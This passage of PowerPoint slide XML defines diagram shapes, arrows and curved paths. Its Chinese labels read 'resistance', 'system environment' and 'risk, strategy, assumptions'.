                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="44" h="44">
                  <a:moveTo>
                    <a:pt x="0" y="44"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="21" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0"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Rectangle 97"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="577115">
              <a:off x="3895155" y="2546760"/>
              <a:ext cx="630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zh-CN" altLang="en-US" sz="1400" i="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>抵抗</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1400" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="37" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3798317" y="2351498"/>
              <a:ext cx="1300163" cy="450850"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 819"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 284"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 819"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 284"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 819"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 284"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 819"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 284"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 819"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 284"/>
                <a:gd name="T10" fmla="*/ 0 w 819"/>
                <a:gd name="T11" fmla="*/ 0 h 284"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 w 819"/>
                <a:gd name="T19" fmla="*/ 0 h 284"/>
                <a:gd name="T20" fmla="*/ 819 w 819"/>
                <a:gd name="T21" fmla="*/ 284 h 284"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T12">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T15">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T16">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
                <a:cxn ang="T17">
                  <a:pos x="T10" y="T11"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T18" t="T19" r="T20" b="T21"/>
              <a:pathLst>
                <a:path w="819" h="284">
                  <a:moveTo>
                    <a:pt x="819" y="42"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="805" y="63"/>
                    <a:pt x="772" y="132"/>
                    <a:pt x="732" y="168"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="692" y="204"/>
                    <a:pt x="637" y="236"/>
                    <a:pt x="579" y="255"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="521" y="274"/>
                    <a:pt x="464" y="284"/>
                    <a:pt x="384" y="279"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="304" y="274"/>
                    <a:pt x="160" y="268"/>
                    <a:pt x="96" y="222"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="32" y="176"/>
                    <a:pt x="16" y="88"/>
                    <a:pt x="0" y="0"/>
                  </a:cubicBezTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38100">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8" name="AutoShape 106"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="15942656">
            <a:off x="5136860" y="2472635"/>
            <a:ext cx="325539" cy="369204"/>
          </a:xfrm>
          <a:prstGeom prst="leftArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 45454"/>
              <a:gd name="adj2" fmla="val 46556"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DDDDDD"/>
          </a:solidFill>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="eaVert"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1800">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="154" name="组合 153"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4350767" y="1683160"/>
            <a:ext cx="1931988" cy="871538"/>
            <a:chOff x="4350767" y="1683160"/>
            <a:chExt cx="1931988" cy="871538"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="29" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5238179" y="1999073"/>
              <a:ext cx="46037" cy="44450"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 44"/>
                <a:gd name="T1" fmla="*/ 0 h 43"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 44"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 43"/>
                <a:gd name="T4" fmla="*/ 0 w 44"/>
                <a:gd name="T5" fmla="*/ 0 h 43"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 44"/>
                <a:gd name="T7" fmla="*/ 0 h 43"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 44"/>
                <a:gd name="T13" fmla="*/ 0 h 43"/>
                <a:gd name="T14" fmla="*/ 44 w 44"/>
                <a:gd name="T15" fmla="*/ 43 h 43"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="44" h="43">
                  <a:moveTo>
                    <a:pt x="44" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="23" y="43"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>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未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4350767" y="1683160"/>
              <a:ext cx="1931988" cy="871538"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T1" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T2" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T3" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T4" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T8" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T9" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T10" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T11" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T12" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T13" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T14" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T15" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T16" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T17" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T18" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T19" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T20" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T21" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T22" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T23" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T24" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T25" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T26" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T27" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T28" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T29" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T30" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T31" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T32" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T33" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T34" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T35" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T36" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T37" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T38" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T39" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T40" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T41" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T42" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T43" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T44" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T45" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T46" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T47" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T48" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T49" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T50" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T51" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T52" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T53" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T54" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T55" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T56" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T57" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T58" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T59" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T60" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T61" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T62" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T63" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T64" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T65" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T66" fmla="*/ 0 w 432"/>
                <a:gd name="T67" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T68" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T69" fmla="*/ 2147483647 h 425"/>
                <a:gd name="T70" fmla="*/ 2147483647 w 432"/>
                <a:gd name="T71" fmla="*/ 2147483647 h 42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32"/>
                <a:gd name="T109" fmla="*/ 0 h 425"/>
                <a:gd name="T110" fmla="*/ 432 w 432"/>
                <a:gd name="T111" fmla="*/ 425 h 42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32" h="425">
                  <a:moveTo>
                    <a:pt x="61" y="333"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="65" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="75" y="371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="86" y="384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="390"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117" y="391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="146" y="405"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="163" y="418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="180" y="425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="202" y="425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="236" y="407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="376"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="265" y="386"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280" y="393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="301" y="393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="323" y="388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="342" y="373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="357" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373" y="354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="390" y="346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="401" y="333"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411" y="316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="409" y="293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="403" y="270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="392" y="250"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="378" y="233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="397" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="417" y="182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="432" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="430" y="125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="422" y="100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="411" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="396" y="59"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="374" y="44"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="365" y="25"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="348" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="309" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="290" y="6"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="252" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="250" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="238" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="223" y="55"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204" y="53"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="57"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="169" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="156" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="113" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="92" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="93"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="131"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="197"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="33" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="280"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="301"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="61" y="333"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="DDDDDD"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:schemeClr val="folHlink"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="40" name="Rectangle 108"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4471417" y="2026060"/>
              <a:ext cx="180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0" hangingPunct="0">
                <a:lnSpc>
                  <a:spcPct val="80000"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>系统</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>环境</a:t>
              </a:r>
              <a:br>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
              </a:br>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>风险，策略</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>,</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="FF0000"/>
                  </a:solidFill>
                  <a:latin typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>假设</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="156" name="组合 155"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5985891" y="1875248"/>
            <a:ext cx="1306513" cy="560387"/>
            <a:chOff x="5985891" y="1875248"/>
            <a:chExt cx="1306513" cy="560387"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="22" name="Group 61"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="6549454" y="1875248"/>
              <a:ext cx="742950" cy="560387"/>
              <a:chOff x="0" y="0"/>
              <a:chExt cx="468" cy="353"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="108" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="86" y="0"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 425"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 425"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 425"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 425"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
                  <a:gd name="T9" fmla="*/ 1 h 425"/>
                  <a:gd name="T10" fmla="*/ 1 w 576"/>
                  <a:gd name="T11" fmla="*/ 1 h 425"/>
                  <a:gd name="T12" fmla="*/ 1 w 576"/>
                  <a:gd name="T13" fmla="*/ 1 h 425"/>
                  <a:gd name="T14" fmla="*/ 1 w 576"/>
                  <a:gd name="T15" fmla="*/ 1 h 425"/>
                  <a:gd name="T16" fmla="*/ 1 w 576"/>
                  <a:gd name="T17" fmla="*/ 1 h 425"/>
                  <a:gd name="T18" fmla="*/ 1 w 576"/>
                  <a:gd name="T19" fmla="*/ 1 h 425"/>
                  <a:gd name="T20" fmla="*/ 1 w 576"/>
                  <a:gd name="T21" fmla="*/ 1 h 425"/>
                  <a:gd name="T22" fmla="*/ 1 w 576"/>
                  <a:gd name="T23" fmla="*/ 1 h 425"/>
                  <a:gd name="T24" fmla="*/ 1 w 576"/>
                  <a:gd name="T25" fmla="*/ 1 h 425"/>
                  <a:gd name="T26" fmla="*/ 1 w 576"/>
                  <a:gd name="T27" fmla="*/ 1 h 425"/>
                  <a:gd name="T28" fmla="*/ 1 w 576"/>
                  <a:gd name="T29" fmla="*/ 1 h 425"/>
                  <a:gd name="T30" fmla="*/ 1 w 576"/>
                  <a:gd name="T31" fmla="*/ 1 h 425"/>
                  <a:gd name="T32" fmla="*/ 1 w 576"/>
                  <a:gd name="T33" fmla="*/ 1 h 425"/>
                  <a:gd name="T34" fmla="*/ 1 w 576"/>
                  <a:gd name="T35" fmla="*/ 1 h 425"/>
                  <a:gd name="T36" fmla="*/ 1 w 576"/>
                  <a:gd name="T37" fmla="*/ 1 h 425"/>
                  <a:gd name="T38" fmla="*/ 0 w 576"/>
                  <a:gd name="T39" fmla="*/ 1 h 4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6"/>
                  <a:gd name="T61" fmla="*/ 0 h 425"/>
                  <a:gd name="T62" fmla="*/ 576 w 576"/>
                  <a:gd name="T63" fmla="*/ 425 h 4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6" h="425">
                    <a:moveTo>
                      <a:pt x="0" y="372"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="372"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="543" y="349"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="509" y="332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="470" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="432" y="319"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="394" y="323"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="349"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="372"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="182" y="421"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="144" y="425"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="106" y="421"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="412"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="395"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="372"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFFF"/>
              </a:solidFill>
              <a:ln w="3175">
                <a:solidFill>
                  <a:schemeClr val="folHlink"/>
                </a:solidFill>
                <a:round/>
                <a:headEnd/>
                <a:tailEnd/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="109" name="未知"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="43" y="36"/>
                <a:ext cx="382" cy="282"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 576"/>
                  <a:gd name="T1" fmla="*/ 1 h 426"/>
                  <a:gd name="T2" fmla="*/ 0 w 576"/>
                  <a:gd name="T3" fmla="*/ 0 h 426"/>
                  <a:gd name="T4" fmla="*/ 1 w 576"/>
                  <a:gd name="T5" fmla="*/ 0 h 426"/>
                  <a:gd name="T6" fmla="*/ 1 w 576"/>
                  <a:gd name="T7" fmla="*/ 1 h 426"/>
                  <a:gd name="T8" fmla="*/ 1 w 576"/>
